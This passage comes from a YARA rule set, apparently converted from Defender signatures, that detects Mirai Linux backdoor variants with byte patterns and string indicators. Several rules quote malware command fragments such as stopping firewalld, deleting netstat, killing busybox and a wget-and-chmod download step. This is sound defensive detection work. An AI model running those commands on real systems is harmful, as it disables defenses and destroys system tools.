        $x_1_1 = "killer finished" ascii //weight: 1
        $x_1_2 = "killed pid" ascii //weight: 1
        $x_1_3 = "malicious pid" ascii //weight: 1
        $x_1_4 = "hlLjztqZ" ascii //weight: 1
        $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_6 = "killed malicious" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BN_2147819490_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BN!xp"
        threat_id = "2147819490"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 67 65 74 [0-38] 2f 74 6d 70 2f 73 6b 65 72 65}  //weight: 1, accuracy: Low
        $x_1_2 = "/tmp/skere PLANES" ascii //weight: 1
        $x_1_3 = "SERVZUXO" ascii //weight: 1
        $x_1_4 = "/bin/busybox" ascii //weight: 1
        $x_1_5 = "chmod 777 * /tmp/skere" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_S_2147819493_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.S!MTB"
        threat_id = "2147819493"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "udphex" ascii //weight: 1
        $x_1_2 = "tcprand" ascii //weight: 1
        $x_1_3 = "udprand" ascii //weight: 1
        $x_1_4 = "bypass" ascii //weight: 1
        $x_1_5 = "tcpplain" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_BK_2147819509_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BK!xp"
        threat_id = "2147819509"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {30 43 e2 19 00 53 e3 0c 20 c9 97 05 3a 8d 92 6c}  //weight: 1, accuracy: High
        $x_1_2 = {30 a0 e3 a8 35 46 e5 ac 05 16 e5 e6 2a 00 eb 00 30 e0 e3 ac 35 06 e5 40 20}  //weight: 1, accuracy: High
        $x_1_3 = {3c 8d e2 70 30 83 e2 03 20 8c e0 a4 30 12 e5 33 31 a0 e1 01 00 13}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_BL_2147819510_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BL!xp"
        threat_id = "2147819510"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {7f c0 fe 70 83 81 00 10 7c 03 f2 78 83 a1 00 14 7c 63 00 50 80 01 00 24 7c 63 fe 70 83 c1 00 18 7f 63 18 38 83 e1 00 1c 83 61 00 0c 7c 08 03 a6 38 21 00 20}  //weight: 1, accuracy: High
        $x_1_2 = {2f 84 00 03 55 00 58 28 54 eb 6c fe 7d 00 02 78 7c eb 5a 78 2f 04 00 01 7c 0b 5a 78 54 00 c2 3e 7c 0a 03 78 7c 00 5a 78 41 bd ff b4 7d 40 5a 78 38 84 ff fe 41 9a 00 34 b0 03 00 00 38 63 00 02}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BM_2147819511_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BM!xp"
        threat_id = "2147819511"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {89 c2 83 ee 02 c1 e2 0b 31 c2 44 89 c0 c1 e8 13 89 d1 44 31 c0 c1 e9 08 31 c2 31 d1 66 89 0f 48 83 c7 02}  //weight: 1, accuracy: High
        $x_1_2 = {0f b6 85 a7 f7 ff ff 85 c0 89 85 ac f7 ff ff 0f 8e fd 00 00 00 44 89 f8 4c 8b ad 98 f7 ff ff 4c 8b a5 98 f7 ff ff 66 c1 c8 08 66 89 85 be f7 ff ff 8b 85 ac f7 ff ff 45 31 f6 49 83 c5 02 ff c8 48 ff c0 48 89 85 88 f7 ff ff}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AV_2147819518_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AV!xp"
        threat_id = "2147819518"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "[http flood] header" ascii //weight: 1
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = {b0 30 d7 e1 40 00 13 e3 1e 00 00 0a 38 40 87 e2 04 20 a0 e1}  //weight: 1, accuracy: High
        $x_1_4 = "Multihop attempted" ascii //weight: 1
        $x_1_5 = {06 30 d2 e7 37 30 23 e2 06 30 c2 e7 01 20 82 e2 07 00 52 e1 f9 ff ff 1a}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AX_2147819540_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AX!xp"
        threat_id = "2147819540"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rm -rf /bin/netstat" ascii //weight: 1
        $x_1_2 = "pkill -9 busybox" ascii //weight: 1
        $x_1_3 = "/.bash_history" ascii //weight: 1
        $x_1_4 = "service firewalld stop" ascii //weight: 1
        $x_1_5 = {bd 27 00 00 be af 21 f0 a0 03 1c 80 82 8f 00 00 00 00 64 1f 42 24 21 e8 c0 03 00 00 be 8f 08 00 bd}  //weight: 1, accuracy: High
        $x_1_6 = {6e 3c 02 3c 72 f3 42 34 21 18 62 00 18 80 82 8f 00 00}  //weight: 1, accuracy: High
        $x_1_7 = {42 24 08 00 43 ac 03 00 02 24 08 00 c2 af 23 00 00 10}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_BP_2147819587_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BP!MTB"
        threat_id = "2147819587"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {83 c4 10 85 ff 74 19 31 c0 81 bc 24 a8 01 00 00 ff 64 cd 1d 0f 9f c0 03 84 24 a4 01 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {75 20 8b 29 89 c8 29 e8 8b 70 08 8b 50 0c 8b 4e 0c 39 c1 75 3d 39 4a 08 75 38 01 ef 89 56 0c 89 72 08}  //weight: 1, accuracy: High
        $x_1_3 = {7e 20 3a 43 04 74 23 8d 53 08 31 c9 eb ?? 0f b6 42 04 89 d3 83 c2 08 3a 44 24 03 74 0d 41 39 f1 75 ec 8b 44 24 1c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BO_2147819635_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BO!MTB"
        threat_id = "2147819635"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {89 e5 0f b6 55 08 0f b6 45 0c 0f b6 4d 10 c1 e2 18 c1 e0 10 09 c2 0f b6 45 14 c1 e1 08 5d 09 c2 09 d1 89 ca 89 c8 81 e2 00 ff 00 00 c1 e2 08 c1 e0 18 09 d0 89 ca 81 e1 00 00 ff 00 c1 ea 18 c1 e9 08 09 ca 09 d0}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BJ_2147819867_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BJ!xp"
        threat_id = "2147819867"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 04 85 20 e1 50 00 31 c2 8b 45 fc 31 d0 89 c2 81 f2 b9 79 37 9e 48 63 c1 89 14 85 20 e1 50 00}  //weight: 1, accuracy: High
        $x_1_2 = {8b 0d 39 d9 10 00 8b 55 f0 8b 45 f4 89 c3 29 d3 89 da 89 c8 89 14 85 20 e1 50 00 89 c8 8b 04 85 20 e1 50 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BJ_2147819867_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BJ!xp"
        threat_id = "2147819867"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hbot proc starting..." ascii //weight: 1
        $x_1_2 = "/bin/busybox" ascii //weight: 1
        $x_1_3 = "hlLjztqZ" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BO_2147819870_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BO!xp"
        threat_id = "2147819870"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {48 e7 3c 00 42 80 10 2f 00 17 22 00 e7 89 d0 80 92 80 22 41 d3 fc 80 00 fe 04 20 39 80 00 fb 32 4a 69 00 04 67 38 1a 00 28 00 e0 8c 26 00 42 43 48 43 24 00 72 18}  //weight: 1, accuracy: High
        $x_1_2 = {20 41 d1 d1 bb 10 20 41 d1 d1 b9 10 20 41 d1 d1 b7 10 20 41 d1 d1 b5 10 52 81 42 80 30 29 00 04 b2 80}  //weight: 1, accuracy: High
        $x_1_3 = {10 19 14 00 49 c2 16 02 49 c3 0c 03 00 20 67 f0 0c 03 00 09 67 ea 0c 03 00 0a 67 e4 0c 00 00 2d 67 00 00 bc 0c 00 00 2b 67 00 00 a0 20 3c 7f ff ff ff}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_BP_2147819871_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BP!xp"
        threat_id = "2147819871"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {3c 50 9f e5 3c 60 9f e5 00 30 95 e5 00 20 96 e5 34 e0 9f e5 34 40 9f e5 83 35 23 e0 a2 09 22 e0 00 10 9e e5 00 c0 94 e5 00 00 23 e0 23 04 20 e0 00 10 85 e5 00 c0 8e e5 00 20 84 e5 00 00 86 e5}  //weight: 1, accuracy: High
        $x_1_2 = {5e 2e 8d e2 17 1d 8d e2 10 30 a0 e3 04 20 82 e2 08 10 81 e2 e4 35 8d e5}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BR_2147819872_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BR!xp"
        threat_id = "2147819872"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {02 40 00 92 10 00 02 80 a0 40 0a 02 80 00 08 84 00 a0 08 86 00 e0 01 80 a0 c0 08 32 bf ff fa c2 08 a0 04 81 c3 e0 08 90 10 00 0b d6 02 40 00 81 c3 e0 08 90 10 00 0b}  //weight: 1, accuracy: High
        $x_1_2 = {04 80 00 2a b0 10 00 08 80 a4 a0 01 02 80 00 31 80 a4 a0 02 c2 0c 20 01 02 80 00 2e c2 2a 20 04 b2 04 bf}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BW_2147820138_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BW!MTB"
        threat_id = "2147820138"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {48 8b 34 24 48 98 66 83 7c 24 14 ff 48 8b 1c c6 4c 8d 63 14 75 09 e8 [0-5] 66 89 43 04 be 14 00 00 00 48 89 df 66 c7 43 0a 00 00 e8 [0-5] 48 63 8c 24 4c 01 00 00 66 89 43 0a 48 89 df 66 41 c7 44 24 10 00 00 48 c1 e1 04 49 8d 74 0d 00 8b 46 04 8d 50 01 66 c1 c8 08 0f b7 c0 89 56 04}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BS_2147820176_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BS!xp"
        threat_id = "2147820176"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {a0 03 2a 70 00 16 82 70 02 00 74 c2 08 73 14 14 1f 30 40 22 44 00 15 23 82 00 00 a5 00 1e 02 11 01 d8}  //weight: 1, accuracy: High
        $x_1_2 = {00 34 10 1c 40 34 14 1c 80 34 18 1c c0 34 1c 1c 00 35 20 1c 40 35 24 1c 80 35 2f 0d 34 11 28 1c c0 35 08 77 42 0d 20 03 00 80 42 25 02 11 1b 0a}  //weight: 1, accuracy: High
        $x_1_3 = {c0 d0 1c 48 b3 41 c6 42 c7 0c 1c 00 34 10 1c 40 34 14 1c 80 34 18 1c c0 34 2c 1c 00 36 1c 1c}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_BT_2147820178_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BT!xp"
        threat_id = "2147820178"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {30 43 e2 19 00 53 e3 0c 20 ca 97 05 3a 8d 92 64}  //weight: 1, accuracy: High
        $x_1_2 = {00 c0 96 e5 51 3c 8d e2 ac 22 a0 e1 68 30 83}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BV_2147820179_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BV!xp"
        threat_id = "2147820179"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 44 24 34 89 44 24 0c 0f b6 44 24 12 89 44 24 08 8b 44 24 2c 89 44 24 04 0f b6 44 24 13 89 04 24}  //weight: 1, accuracy: High
        $x_1_2 = {31 c0 89 44 24 34 8b 44 24 40 85 c0 74 51 0f b6 1f 84 db 88 5c 24 33 0f 85 ae 00 00 00 31 c0 89 44 24 3c}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_W_2147820251_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.W!MTB"
        threat_id = "2147820251"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 85 ff 74 ?? 80 3f 00 74 ?? 48 89 fa 66 66 ?? 0f b6 42 01 48 ff c2 84 c0 75 ?? 89 d1 29 f9 48 85 f6 74 ?? 80 3e 00 74 ?? 48 89 f2 66 66 66 ?? 0f b6 42 01 48 ff c2 84 c0 75 ?? 89 d0 29 f0 39 c1 89 c2}  //weight: 1, accuracy: Low
        $x_1_2 = {43 30 86 8c 14 05 08 83 ec 0c 57 e8 ?? ?? 00 00 83 c4 10 39 d8 77 e6 83 ec 0c 46 55 e8 ?? ?? 00 00 83 c4 10 39 f0 77 d1 83 c4 0c}  //weight: 1, accuracy: Low
        $x_1_3 = {85 c0 75 e9 bf ?? ?? 40 00 e8 ?? ?? 00 00 8b 05 ?? ?? 10 00 3d 67 01 00 00 0f 9f c2 ff c0 89 05 ?? ?? 10 00 84 d2 74 ?? b8 00 00 00 00 e8 12 02 00 00 8b 05 ?? ?? 10 00 8d 14 00 8d 04 95 00 00 00 00 8d 04 02}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_BW_2147820431_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BW!xp"
        threat_id = "2147820431"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {30 d6 e5 1f 00 53 e3 12 00 00 8a 10 40 96 e5 76 1e 00 eb}  //weight: 1, accuracy: High
        $x_1_2 = {19 30 96 e5 00 00 53 e3 04 30 a0 13 93 35 46 15 93 35 46 05 55 ff ff 0a 00 30 e0 e3 00 50 a0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BX_2147820432_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BX!xp"
        threat_id = "2147820432"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {41 ef 51 68 2f 48 00 32 20 2f 00 5a 58 80 2f 40 00 3e 22 2f 00 5a 06 81 00 00 05 b4 2f 41 00 46 24}  //weight: 1, accuracy: High
        $x_1_2 = {81 72 04 b2 80 65 42 30 3b 0a 06 4e fb 00 02 00 0a 19 72 19 ae 1a 16 19 e2}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AK_2147821105_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AK!MTB"
        threat_id = "2147821105"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {13 dd 4d e2 0c d0 4d e2 a0 01 9f e5 01 40 a0 e1 ?? ff ff eb 12 bd 8d e2 0f b0 8b e2 00 10 a0 e1 0b 00 a0 e1 ?? 0b 00 eb 04 30 94 e5 00 00 53 e3 7c 11 9f e5 0b 00 a0 e1 03 10 a0 11 ?? 0b 00 eb ?? 16 00 eb 00 00 50 e3 04 00 00 da 00 00 a0 e3 cc d0 8d e2}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AL_2147822180_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AL!MTB"
        threat_id = "2147822180"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {89 d0 03 01 89 eb 30 18 89 d0 03 01 89 fb 30 18 89 d0 03 01 89 f3 30 18 89 d0 03 01 8a 1c 24 30 18 42 8b 41 04 25 ff ff 00 00 39 d0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AQ_2147822182_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AQ!MTB"
        threat_id = "2147822182"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {00 40 97 e5 00 00 54 e3 0c ?? ?? 0a 30 31 9f e5 03 30 96 e7 00 40 83 e5 2f 10 a0 e3 00 00 97 e5 e7 ?? ?? eb 1c 31 9f e5 00 00 50 e3 03 20 96 e7 01 30 80 12 00 00 82 e5 00 30 82 15 00 40 82 05 04 21 9f e5 04 31 9f e5 03 30 62 e0}  //weight: 1, accuracy: Low
        $x_1_2 = {02 30 83 e0 4c 21 13 e5 1f 10 04 e2 52 21 a0 e1 01 00 12 e3 c6 ff ff 0a 0a 00 a0 e1 dc 0a 00 eb 0a 10 a0 e1 00 20 a0 e1 01 39 a0 e3 04 00 a0 e1 3d 0c 00 eb 58 45 9d e5 5c 75 8d e5 8f ff ff ea}  //weight: 1, accuracy: High
        $x_1_3 = {03 00 95 e8 03 00 84 e8 ?? ?? 00 eb b6 20 d7 e1 01 00 00 e2 18 30 8d e2 00 01 a0 e1 03 00 80 e0 22 34 a0 e1 ff 20 02 e2 02 24 83 e1 08 10 10 e5 01 39 a0 e3 08 00 a0 e1 ?? 0d 00 eb 00 00 a0 e3 ?? 01 00 eb 09 30 d7 e5 03 30 8a e0 03 00 50 e1 ea ff ff ba}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_BU_2147822218_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BU!xp"
        threat_id = "2147822218"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 58 81 21 00 1c 88 09 00 00 2f 80 00 72}  //weight: 1, accuracy: High
        $x_1_2 = {01 a4 89 23 00 0b 2f 89 00 2e 41 be ff e8 3f 40 10 03 55 29 08 3c 81 5a}  //weight: 1, accuracy: High
        $x_1_3 = {83 81 00 30 83 a1 00 34 83 c1 00 38 83 e1 00 3c 38 21 00 40 4e 80 00 20 88 1d 00 00 3b c0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_BZ_2147822220_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BZ!xp"
        threat_id = "2147822220"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {20 84 e5 02 10 c4 e5 10 20 93 e5 14 10 84 e2 40 c4 a0 e1 58 30 a0 e3 05 c0 c4 e5 04 00 c4 e5 03 30 c1 e5 0d}  //weight: 1, accuracy: High
        $x_1_2 = {30 c0 e5 26 30 d4 e5 b0 30 c3 e3 40 30 83 e3 26 30 c4 e5 14 30 9d e5 1c 10 87}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CA_2147822221_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CA!xp"
        threat_id = "2147822221"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {30 43 e2 19 00 53 e3 0c 20 cb 97 05 3a 8d 92 70}  //weight: 1, accuracy: High
        $x_1_2 = {31 a0 e1 02 30 83 e0 24 21 13 e5 1f 10 00 e2 32 21 a0 e1 01 00 12}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CB_2147822222_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CB!xp"
        threat_id = "2147822222"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {30 a0 e3 4d 51 ce e5 97 05 16 e5 50 c1 8e e5 93 35 46 e5 20 c0 9d e5 4c 31 ce e5 24 30 9d e5 51 1c 8d}  //weight: 1, accuracy: High
        $x_1_2 = {19 30 96 e5 00 00 53 e3 04 30 a0 13 93 35 46 15 93 35 46 05 55 ff ff 0a 00 30 e0 e3 00 50 a0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CC_2147822224_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CC!xp"
        threat_id = "2147822224"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {08 a0 e1 20 08 a0 e1 70 80 bd e8 f0 4f 2d e9 22 dc 4d e2 24 d0 4d e2 01 aa 8d e2 24 a0 8a e2 21 a0 4a e2 24 b0}  //weight: 1, accuracy: High
        $x_1_2 = {e5 00 00 52 e3 3a 00 52 13 00 30 a0 03 01 30 a0 13 03 10 a0 01 05 00 00 0a 00 10 a0 e3 01 10 81}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_CD_2147822225_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CD!xp"
        threat_id = "2147822225"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 57 e3 04 30 c0 e5 01 30 84 e2 2d 00 00 0a 01 40 d3 e5 09}  //weight: 1, accuracy: High
